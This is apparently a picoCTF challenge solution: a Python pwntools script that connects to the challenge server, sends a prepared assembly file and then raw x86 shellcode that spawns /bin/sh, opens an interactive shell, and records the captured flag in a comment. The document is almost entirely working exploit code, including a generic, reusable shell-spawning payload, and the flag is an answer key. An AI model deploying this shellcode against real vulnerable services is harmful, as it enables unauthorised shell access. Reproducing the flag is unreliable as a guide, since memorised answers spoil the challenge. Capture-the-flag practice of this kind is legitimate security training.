
from pwn import *

r = remote('mercury.picoctf.net', 26072)

shell = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

r.readline()

with open('filtered_shellcode','rb') as f:
    ASM = f.read()

r.sendline(ASM)
r.sendline(shell)

r.interactive()

# picoCTF{th4t_w4s_fun_bb572e7da674111e}